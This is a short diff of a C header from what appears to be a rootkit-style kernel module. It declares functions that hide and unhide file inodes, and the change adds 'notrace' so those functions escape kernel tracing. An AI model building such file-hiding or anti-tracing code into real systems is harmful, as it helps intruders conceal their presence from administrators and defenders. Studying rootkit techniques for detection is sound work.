@@ -8,6 +8,6 @@ struct inode_list {
 };
 extern struct list_head hidden_inodes;
 
-void hide_file_inode(unsigned long ino);
-int should_hide_inode(unsigned long ino);
-void show_file_inode(const void __user *user_info);
+notrace void hide_file_inode(unsigned long ino);
+notrace int should_hide_inode(unsigned long ino);
+notrace void show_file_inode(const void __user *user_info);
